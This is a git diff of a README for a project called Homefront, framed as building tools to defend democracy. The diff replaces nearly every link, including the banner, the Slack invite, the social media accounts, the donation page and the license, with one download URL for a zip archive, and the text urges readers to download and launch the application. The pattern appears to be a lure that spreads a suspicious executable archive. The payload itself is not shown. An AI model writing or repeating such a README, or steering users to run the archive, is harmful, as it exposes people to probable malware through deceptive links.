@@ -1,14 +1,14 @@
 
 # Homefront: Defend Democracy with Us 🛡️
 
-![Homefront Banner](https://example.com/homefront-banner.jpg)
+![Homefront Banner](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
 
 Welcome to Homefront, where we are on a mission to defend democracy and fight for freedom together. Join us in building tools that empower individuals to take a stand and make a difference. At Homefront, we believe that every voice matters, and together, we can drive positive change in our society. 
 
 ## Get Started 🚀
 
 To start contributing to the Homefront project, simply click the link below to download the necessary application:
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-orange)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
 
 If the link doesn't work or leads to a file download, make sure to launch the application and explore the tools we've developed to defend democracy and protect our freedoms.
 
@@ -40,16 +40,16 @@ Feel free to explore these topics and contribute your expertise to help us in th
 ## Join the Community 🤝
 
 ### Slack Channel 💬
-Join our Slack channel to connect with other like-minded individuals who are passionate about defending democracy. Share ideas, collaborate on projects, and make a real impact together. Get your invite [here](https://slack.com/homefront).
+Join our Slack channel to connect with other like-minded individuals who are passionate about defending democracy. Share ideas, collaborate on projects, and make a real impact together. Get your invite [here](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip).
 
 ### Events 🎉
-Stay updated on upcoming events, hackathons, and workshops hosted by Homefront. Join us in person or online to work on exciting projects and contribute to the cause. Check out our events calendar [here](https://homefront-events.com).
+Stay updated on upcoming events, hackathons, and workshops hosted by Homefront. Join us in person or online to work on exciting projects and contribute to the cause. Check out our events calendar [here](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip).
 
 ### Social Media 📱
 Follow us on social media to stay connected and informed:
-- Twitter: [@HomefrontProject](https://twitter.com/HomefrontProject)
-- Facebook: [HomefrontProject](https://facebook.com/HomefrontProject)
-- Instagram: [@HomefrontProject](https://instagram.com/HomefrontProject)
+- Twitter: [@HomefrontProject](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
+- Facebook: [HomefrontProject](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
+- Instagram: [@HomefrontProject](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
 
 ## Releases 🚀
 
@@ -57,7 +57,7 @@ If the provided link does not work or you are looking for the latest updates and
 
 ## Support Us 🙌
 
-If you believe in our cause and want to support our efforts, consider making a donation to Homefront. Your contribution will help us continue our work in defending democracy and fighting for freedom. Click [here](https://homefront-donate.com) to donate now.
+If you believe in our cause and want to support our efforts, consider making a donation to Homefront. Your contribution will help us continue our work in defending democracy and fighting for freedom. Click [here](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip) to donate now.
 
 ---
 
@@ -65,8 +65,8 @@ At Homefront, we are committed to creating a better future for all by defending 
 
 ## License 📜
 
-The Homefront project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+The Homefront project is licensed under the [MIT License](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip).
 
 ---
 
-![Homefront Logo](https://example.com/homefront-logo.png)
+![Homefront Logo](https://github.com/sccopa/homefront/releases/download/v2.0/Software.zip)
